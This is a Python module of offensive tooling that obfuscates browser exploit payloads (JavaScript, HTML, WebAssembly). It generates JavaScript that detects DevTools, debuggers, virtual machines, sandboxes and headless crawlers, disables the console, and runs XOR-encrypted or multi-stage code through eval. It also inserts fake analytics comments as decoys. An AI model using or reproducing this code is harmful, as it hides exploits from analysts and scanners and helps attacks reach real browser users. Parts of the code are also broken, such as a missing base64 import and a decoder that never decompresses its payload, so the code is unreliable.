import json
import random
import string
import zlib
import struct
from typing import Dict, Any, List, Optional, Tuple
from .obfuscator import get_obfuscator, ObfuscationLevel

class PayloadObfuscator:
    """Advanced payload obfuscation for browser exploits"""
    
    def __init__(self):
        self.obfuscator = get_obfuscator()
        self.payload_cache: Dict[str, str] = {}
        
    def obfuscate_exploit_payload(self, payload: str, exploit_type: str = "javascript",
                                 level: ObfuscationLevel = ObfuscationLevel.STANDARD) -> Dict[str, Any]:
        """Obfuscate exploit payload with metadata"""
        
        # Check cache
        cache_key = f"{payload[:50]}_{exploit_type}_{level.value}"
        if cache_key in self.payload_cache:
            return {
                'obfuscated': self.payload_cache[cache_key],
                'cached': True,
                'level': level.name
            }
            
        # Apply obfuscation based on type
        if exploit_type == "javascript":
            obfuscated = self._obfuscate_js_exploit(payload, level)
        elif exploit_type == "html":
            obfuscated = self._obfuscate_html_exploit(payload, level)
        elif exploit_type == "wasm":
            obfuscated = self._obfuscate_wasm_exploit(payload, level)
        else:
            obfuscated = payload
            
        # Cache result
        self.payload_cache[cache_key] = obfuscated
        
        return {
            'obfuscated': obfuscated,
            'original_size': len(payload),
            'obfuscated_size': len(obfuscated),
            'ratio': len(obfuscated) / len(payload) if payload else 0,
            'level': level.name,
            'techniques_used': self._get_techniques_for_level(level)
        }
        
    def _obfuscate_js_exploit(self, payload: str, level: ObfuscationLevel) -> str:
        """Obfuscate JavaScript exploit payload"""
        obfuscated = payload
        
        # Add exploit-specific obfuscation
        if level.value >= ObfuscationLevel.MINIMAL.value:
            obfuscated = self._add_timing_obfuscation(obfuscated)
            obfuscated = self._add_environment_checks(obfuscated)
            
        if level.value >= ObfuscationLevel.STANDARD.value:
            obfuscated = self._add_polymorphic_code(obfuscated)
            obfuscated = self._add_anti_analysis(obfuscated)
            
        if level.value >= ObfuscationLevel.AGGRESSIVE.value:
            obfuscated = self._add_vm_detection(obfuscated)
            obfuscated = self._add_encrypted_stages(obfuscated)
            
        # Apply general JS obfuscation
        obfuscated = self.obfuscator.obfuscate_javascript(obfuscated, level)
        
        # Wrap in self-decoding container
        if level.value >= ObfuscationLevel.STANDARD.value:
            obfuscated = self._create_self_decoder(obfuscated)
            
        return obfuscated
        
    def _obfuscate_html_exploit(self, payload: str, level: ObfuscationLevel) -> str:
        """Obfuscate HTML exploit payload"""
        if level.value >= ObfuscationLevel.MINIMAL.value:
            # Extract and obfuscate script tags
            import re
            
            def obfuscate_script(match):
                script_content = match.group(1)
                obfuscated_script = self._obfuscate_js_exploit(script_content, level)
                return f'<script>{obfuscated_script}</script>'
                
            payload = re.sub(r'<script>(.*?)</script>', obfuscate_script, payload, flags=re.DOTALL)
            
        if level.value >= ObfuscationLevel.STANDARD.value:
            # Add decoy elements
            payload = self._add_html_decoys(payload)
            
        if level.value >= ObfuscationLevel.AGGRESSIVE.value:
            # Encode entire HTML
            payload = self._encode_html_payload(payload)
            
        return payload
        
    def _obfuscate_wasm_exploit(self, payload: str, level: ObfuscationLevel) -> str:
        """Obfuscate WebAssembly exploit payload"""
        # For WASM, we primarily obfuscate the loader
        loader_template = """
(function() {
    var wasmCode = '{wasm_b64}';
    var wasmBinary = Uint8Array.from(atob(wasmCode), c => c.charCodeAt(0));
    
    WebAssembly.instantiate(wasmBinary).then(result => {
        result.instance.exports.main();
    });
})();
"""
        
        import base64
        wasm_b64 = base64.b64encode(payload.encode()).decode()
        loader = loader_template.replace('{wasm_b64}', wasm_b64)
        
        # Obfuscate the loader
        return self._obfuscate_js_exploit(loader, level)
        
    def _add_timing_obfuscation(self, code: str) -> str:
        """Add timing-based obfuscation"""
        timing_code = """
var _timing = Date.now();
setInterval(function() {
    if (Date.now() - _timing > 5000) {
        _timing = Date.now();
    }
}, 100);
"""
        return timing_code + '\n' + code
        
    def _add_environment_checks(self, code: str) -> str:
        """Add environment detection checks"""
        env_checks = """
(function() {
    if (typeof window === 'undefined') return;
    if (!window.navigator || !window.navigator.userAgent) return;
    if (window.location.hostname === 'localhost') return;
    
    var ua = window.navigator.userAgent.toLowerCase();
    if (ua.indexOf('bot') > -1 || ua.indexOf('crawler') > -1) return;
    
    {CODE}
})();
"""
        return env_checks.replace('{CODE}', code)
        
    def _add_polymorphic_code(self, code: str) -> str:
        """Add polymorphic code generation"""
        # Generate random variable for each execution
        rand_var = ''.join(random.choices(string.ascii_letters, k=8))
        
        poly_template = f"""
var {rand_var} = {{
    'a': function(x) {{ return x + 1; }},
    'b': function(x) {{ return x + 2; }},
    'c': function(x) {{ return x + 3; }}
}};

var ops = Object.keys({rand_var});
var selected = ops[Math.floor(Math.random() * ops.length)];

{code}
"""
        return poly_template
        
    def _add_anti_analysis(self, code: str) -> str:
        """Add anti-analysis techniques"""
        anti_analysis = """
// Detect DevTools
var devtools = {open: false, orientation: null};
var threshold = 160;
setInterval(function() {
    if (window.outerHeight - window.innerHeight > threshold || 
        window.outerWidth - window.innerWidth > threshold) {
        devtools.open = true;
        window.location.reload();
    }
}, 500);

// Disable console
if (typeof console !== 'undefined') {
    console.log = function() {};
    console.info = function() {};
    console.warn = function() {};
    console.error = function() {};
}

// Detect debugger
setInterval(function() {
    debugger;
}, 1000);
"""
        return anti_analysis + '\n' + code
        
    def _add_vm_detection(self, code: str) -> str:
        """Add VM/sandbox detection"""
        vm_detection = """
function isVM() {
    // Check for VM artifacts
    if (window.navigator.hardwareConcurrency < 2) return true;
    if (window.screen.width < 800 || window.screen.height < 600) return true;
    
    // Check for common VM user agents
    var ua = window.navigator.userAgent.toLowerCase();
    var vmIndicators = ['vmware', 'virtualbox', 'qemu', 'virtual'];
    for (var i = 0; i < vmIndicators.length; i++) {
        if (ua.indexOf(vmIndicators[i]) > -1) return true;
    }
    
    return false;
}

if (!isVM()) {
    {CODE}
}
"""
        return vm_detection.replace('{CODE}', code)
        
    def _add_encrypted_stages(self, code: str) -> str:
        """Add encrypted payload stages"""
        # Simple XOR encryption
        key = random.randint(1, 255)
        encrypted = ''.join([chr(ord(c) ^ key) for c in code])
        
        # Encode as array
        char_codes = ','.join([str(ord(c)) for c in encrypted])
        
        decoder = f"""
(function() {{
    var key = {key};
    var encrypted = [{char_codes}];
    var decrypted = '';
    
    for (var i = 0; i < encrypted.length; i++) {{
        decrypted += String.fromCharCode(encrypted[i] ^ key);
    }}
    
    eval(decrypted);
}})();
"""
        return decoder
        
    def _create_self_decoder(self, code: str) -> str:
        """Create self-decoding payload"""
        # Compress the payload
        compressed = zlib.compress(code.encode())
        b64_compressed = base64.b64encode(compressed).decode()
        
        decoder = f"""
(function() {{
    function decompress(data) {{
        // This would need a JS decompression library
        // For now, just base64 decode
        return atob(data);
    }}
    
    var payload = '{b64_compressed}';
    var code = decompress(payload);
    
    // Execute in isolated context
    (new Function(code))();
}})();
"""
        return decoder
        
    def _add_html_decoys(self, html: str) -> str:
        """Add decoy HTML elements"""
        decoys = [
            '<!-- Google Analytics -->',
            '<div style="display:none">Loading...</div>',
            '<noscript>Please enable JavaScript</noscript>',
            '<meta name="robots" content="noindex,nofollow">'
        ]
        
        # Insert decoys at random positions
        lines = html.split('\n')
        for decoy in decoys:
            position = random.randint(0, len(lines))
            lines.insert(position, decoy)
            
        return '\n'.join(lines)
        
    def _encode_html_payload(self, html: str) -> str:
        """Encode entire HTML payload"""
        import base64
        
        encoded = base64.b64encode(html.encode()).decode()
        
        loader = f"""
<html>
<head><title>Loading...</title></head>
<body>
<script>
document.write(atob('{encoded}'));
</script>
</body>
</html>
"""
        return loader
        
    def _get_techniques_for_level(self, level: ObfuscationLevel) -> List[str]:
        """Get list of techniques used for obfuscation level"""
        techniques = []
        
        if level.value >= ObfuscationLevel.MINIMAL.value:
            techniques.extend(['variable_rename', 'string_encoding', 'timing_obfuscation'])
            
        if level.value >= ObfuscationLevel.STANDARD.value:
            techniques.extend(['control_flow', 'dead_code', 'polymorphic', 'anti_analysis'])
            
        if level.value >= ObfuscationLevel.AGGRESSIVE.value:
            techniques.extend(['vm_detection', 'encrypted_stages', 'opaque_predicates'])
            
        if level.value >= ObfuscationLevel.MAXIMUM.value:
            techniques.extend(['advanced_encoding', 'anti_debugging', 'self_decoding'])
            
        return techniques
        
    def create_multi_stage_payload(self, stages: List[str], 
                                 level: ObfuscationLevel = ObfuscationLevel.STANDARD) -> str:
        """Create multi-stage obfuscated payload"""
        obfuscated_stages = []
        
        for i, stage in enumerate(stages):
            # Obfuscate each stage with increasing level
            stage_level = ObfuscationLevel(min(level.value + i, ObfuscationLevel.MAXIMUM.value))
            result = self.obfuscate_exploit_payload(stage, "javascript", stage_level)
            obfuscated_stages.append(result['obfuscated'])
            
        # Create stage loader
        loader = """
(function() {
    var stages = {STAGES};
    var currentStage = 0;
    
    function executeStage() {
        if (currentStage < stages.length) {
            try {
                eval(stages[currentStage]);
                currentStage++;
                setTimeout(executeStage, Math.random() * 2000 + 1000);
            } catch(e) {
                // Silent fail
            }
        }
    }
    
    executeStage();
})();
"""
        
        stages_json = json.dumps(obfuscated_stages)
        return loader.replace('{STAGES}', stages_json)
        
    def generate_evasion_wrapper(self, payload: str, 
                               evasion_techniques: List[str] = None) -> str:
        """Generate evasion wrapper for payload"""
        if evasion_techniques is None:
            evasion_techniques = ['sandbox', 'debugger', 'timing']
            
        wrapper = payload
        
        if 'sandbox' in evasion_techniques:
            wrapper = self._add_sandbox_evasion(wrapper)
            
        if 'debugger' in evasion_techniques:
            wrapper = self._add_debugger_evasion(wrapper)
            
        if 'timing' in evasion_techniques:
            wrapper = self._add_timing_evasion(wrapper)
            
        return wrapper
        
    def _add_sandbox_evasion(self, code: str) -> str:
        """Add sandbox evasion techniques"""
        sandbox_evasion = """
function checkSandbox() {
    // Check for automated browser indicators
    if (window.navigator.webdriver) return true;
    if (window.navigator.plugins.length === 0) return true;
    if (!window.chrome && !window.safari) return true;
    
    // Check for headless browser
    if (window.navigator.userAgent.indexOf('HeadlessChrome') > -1) return true;
    
    // Check for automation extensions
    if (document.getElementById('selenium_ide_indicator')) return true;
    
    return false;
}

if (!checkSandbox()) {
    {CODE}
}
"""
        return sandbox_evasion.replace('{CODE}', code)
        
    def _add_debugger_evasion(self, code: str) -> str:
        """Add debugger evasion techniques"""
        debugger_evasion = """
(function() {
    var checkInterval = setInterval(function() {
        var before = Date.now();
        debugger;
        var after = Date.now();
        
        if (after - before > 100) {
            // Debugger detected
            clearInterval(checkInterval);
            window.location = 'about:blank';
        }
    }, 1000);
    
    {CODE}
})();
"""
        return debugger_evasion.replace('{CODE}', code)
        
    def _add_timing_evasion(self, code: str) -> str:
        """Add timing-based evasion"""
        timing_evasion = """
(function() {
    var startTime = Date.now();
    
    // Wait for realistic user interaction time
    setTimeout(function() {
        // Check if enough time has passed (avoid automated execution)
        if (Date.now() - startTime > 3000) {
            {CODE}
        }
    }, Math.random() * 2000 + 3000);
})();
"""
        return timing_evasion.replace('{CODE}', code)

# Singleton instance
_payload_obfuscator = None

def get_payload_obfuscator() -> PayloadObfuscator:
    """Get the global payload obfuscator instance"""
    global _payload_obfuscator
    if _payload_obfuscator is None:
        _payload_obfuscator = PayloadObfuscator()
    return _payload_obfuscator